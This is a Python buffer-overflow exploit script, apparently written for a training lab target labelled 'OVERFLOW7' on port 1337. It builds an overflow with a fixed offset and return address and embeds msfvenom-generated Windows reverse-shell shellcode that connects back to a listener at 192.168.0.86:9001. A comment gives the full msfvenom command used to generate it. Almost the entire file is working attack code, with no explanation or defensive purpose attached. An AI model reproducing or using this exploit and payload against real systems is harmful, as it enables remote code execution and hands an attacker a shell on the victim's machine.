#!/usr/bin/env python3
import socket

ip = "192.168.0.87"
port = 1337

badchars = "".join([chr(int(hex(x),16)) for x in range(1,256)])
prefix = "OVERFLOW7 "
offset = 1306
overflow = "A" * offset
retn = "\xaf\x11\x50\x62" # \x03\x12\x50\x62 \xaf\x11\x50\x62
padding = "\x90" * 0

# Badchars: \x00\x8c\xae\xbe\xfb
# Payload: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.86 LPORT=9001 EXITFUNC=thread -f c -b "\x00\x8c\xae\xbe\xfb"
payload = (
"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\xbc\x36\x90\xc3\x83\xee\xfc\xe2\xf4\x40\xde\x12\xc3"
"\xbc\x36\xf0\x4a\x59\x07\x50\xa7\x37\x66\xa0\x48\xee\x3a"
"\x1b\x91\xa8\xbd\xe2\xeb\xb3\x81\xda\xe5\x8d\xc9\x3c\xff"
"\xdd\x4a\x92\xef\x9c\xf7\x5f\xce\xbd\xf1\x72\x31\xee\x61"
"\x1b\x91\xac\xbd\xda\xff\x37\x7a\x81\xbb\x5f\x7e\x91\x12"
"\xed\xbd\xc9\xe3\xbd\xe5\x1b\x8a\xa4\xd5\xaa\x8a\x37\x02"
"\x1b\xc2\x6a\x07\x6f\x6f\x7d\xf9\x9d\xc2\x7b\x0e\x70\xb6"
"\x4a\x35\xed\x3b\x87\x4b\xb4\xb6\x58\x6e\x1b\x9b\x98\x37"
"\x43\xa5\x37\x3a\xdb\x48\xe4\x2a\x91\x10\x37\x32\x1b\xc2"
"\x6c\xbf\xd4\xe7\x98\x6d\xcb\xa2\xe5\x6c\xc1\x3c\x5c\x69"
"\xcf\x99\x37\x24\x7b\x4e\xe1\x5e\xa3\xf1\xbc\x36\xf8\xb4"
"\xcf\x04\xcf\x97\xd4\x7a\xe7\xe5\xbb\xc9\x45\x7b\x2c\x37"
"\x90\xc3\x95\xf2\xc4\x93\xd4\x1f\x10\xa8\xbc\xc9\x45\x93"
"\xec\x66\xc0\x83\xec\x76\xc0\xab\x56\x39\x4f\x23\x43\xe3"
"\x07\xa9\xb9\x5e\x50\x6b\xbc\x60\xf8\xc1\xbc\x15\xb9\x4a"
"\x5a\x5c\x80\x95\xeb\x5e\x09\x66\xc8\x57\x6f\x16\x39\xf6"
"\xe4\xcf\x43\x78\x98\xb6\x50\x5e\x60\x76\x1e\x60\x6f\x16"
"\xd4\x55\xfd\xa7\xbc\xbf\x73\x94\xeb\x61\xa1\x35\xd6\x24"
"\xc9\x95\x5e\xcb\xf6\x04\xf8\x12\xac\xc2\xbd\xbb\xd4\xe7"
"\xac\xf0\x90\x87\xe8\x66\xc6\x95\xea\x70\xc6\x8d\xea\x60"
"\xc3\x95\xd4\x4f\x5c\xfc\x3a\xc9\x45\x4a\x5c\x78\xc6\x85"
"\x43\x06\xf8\xcb\x3b\x2b\xf0\x3c\x69\x8d\x70\xde\x96\x3c"
"\xf8\x65\x29\x8b\x0d\x3c\x69\x0a\x96\xbf\xb6\xb6\x6b\x23"
"\xc9\x33\x2b\x84\xaf\x44\xff\xa9\xbc\x65\x6f\x16"
)
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")